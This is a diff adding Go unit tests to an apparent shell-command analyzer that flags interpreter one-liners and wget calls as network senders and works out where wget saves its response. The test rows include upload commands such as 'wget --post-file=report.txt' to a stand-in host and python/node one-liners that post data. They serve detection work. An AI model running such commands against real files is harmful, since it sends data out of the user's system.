@@ -236,3 +236,60 @@ func TestReadSendersBoundRule(t *testing.T) {
 		t.Fatalf("Read tool reading %+v, want not unread", r)
 	}
 }
+
+// GAP-0595: an interpreter one-liner whose code asks for a network capability
+// sends to a destination inside code the projection does not read, so it is a
+// sender with an unknown destination; code with no network capability, or only
+// loopback destinations, is not a sender.
+func TestReadSendersInlineCodeGAP0595(t *testing.T) {
+	checkSenderRows(t, []senderRow{
+		{name: "python urllib", command: `python3 -c "import urllib.request; urllib.request.urlopen(u, data=d)"`,
+			want: SenderInlineCode, unknown: true, unread: true},
+		{name: "node fetch", command: `node -e "fetch(u, {method: 1})"`,
+			want: SenderInlineCode, unknown: true, unread: true},
+		{name: "python print", command: `python3 -c "print(1 + 1)"`, unread: true},
+		{name: "python json", command: `python3 -c "import json; print(json.dumps({}))"`, unread: true},
+		{name: "python loopback only", command: `python3 -c "import urllib.request; urllib.request.urlopen(\"http://127.0.0.1:8080/x\")"`, unread: true},
+	})
+}
+
+// GAP-0595: a wget upload without -O saves its response in the working
+// directory under the last URL segment, so a plain upload is a complete
+// parse; any option that moves or renames the response, a query in the URL
+// or two URLs leave the destination unknown (partial).
+func TestWgetPlainUploadResponseNameGAP0595(t *testing.T) {
+	for _, row := range []struct {
+		name, command string
+		complete      bool
+		saved         string
+	}{
+		{"post-file", "wget --post-file=report.txt https://sink.example/upload", true, "upload"},
+		{"post-file empty path", "wget --post-file=report.txt https://sink.example/", true, "index.html"},
+		{"post-file quiet", "wget -q --no-check-certificate --post-file report.txt https://sink.example/in/", true, "index.html"},
+		{"post-data", "wget --post-data=a=b https://sink.example/f.cgi", true, "f.cgi"},
+		{"query", "wget --post-file=report.txt https://sink.example/up?x=1", false, ""},
+		{"directory prefix", "wget -P out --post-file=report.txt https://sink.example/up", false, ""},
+		{"content disposition", "wget --content-disposition --post-file=report.txt https://sink.example/up", false, ""},
+		{"two urls", "wget --post-file=report.txt https://sink.example/a https://sink.example/b", false, ""},
+		{"plain download", "wget https://sink.example/up", false, ""},
+	} {
+		t.Run(row.name, func(t *testing.T) {
+			facts := Analyze(Input{Tool: "bash", Command: row.command, CWD: "/work/p", DialectHint: DialectPOSIX})
+			if got := facts.Parse.Status == StatusComplete; got != row.complete {
+				t.Fatalf("complete = %v, want %v (status %s, issues %v)", got, row.complete, facts.Parse.Status, facts.Parse.Issues)
+			}
+			saved := ""
+			for _, p := range facts.Paths {
+				if p.Access == PathAccessWrite {
+					saved = p.Resolved
+				}
+			}
+			if want := ""; row.saved != "" {
+				want = "/work/p/" + row.saved
+				if saved != want {
+					t.Fatalf("response saved to %q, want %q", saved, want)
+				}
+			}
+		})
+	}
+}
